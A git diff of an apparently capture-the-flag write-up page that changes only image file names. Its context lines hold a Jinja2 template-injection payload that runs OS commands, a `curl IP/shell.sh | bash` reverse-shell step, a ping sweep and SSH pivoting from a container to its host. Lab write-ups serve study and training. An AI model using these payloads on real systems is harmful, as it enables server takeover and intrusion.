@@ -46,7 +46,7 @@ I was pleased to see that it worked:
 
 With that, I proceeded to dump out the config of this server using `{{config.items()}}`.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (44) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (44) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 The SSTI also granted us RCE on the server with this payload:
 
@@ -54,7 +54,7 @@ The SSTI also granted us RCE on the server with this payload:
 {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (53) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (53) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 With this, we can replace the `id` command with a `curl IP/shell.sh | bash` payload to gain a reverse shell as root on this Docker Container.
 
@@ -72,11 +72,11 @@ for i in {1..254}; do ping -c 1 172.19.0.$i | grep 'from; done
 
 172.19.0.1, but we have no users and cannot do much with this for now. We can check the `/home` directory to find the `augustus` user. Additionally, I used `mount` to check all the directories mounted into the container from the host.
 
-<figure><img src="../../../.gitbook/assets/image (51) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (51) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Since there was no `augustus` user within the `/etc/passwd` file on the container, this must be from the host. I just tried to SSH into 172.19.0.1, and it worked.
 
-<figure><img src="../../../.gitbook/assets/image (52) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (52) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
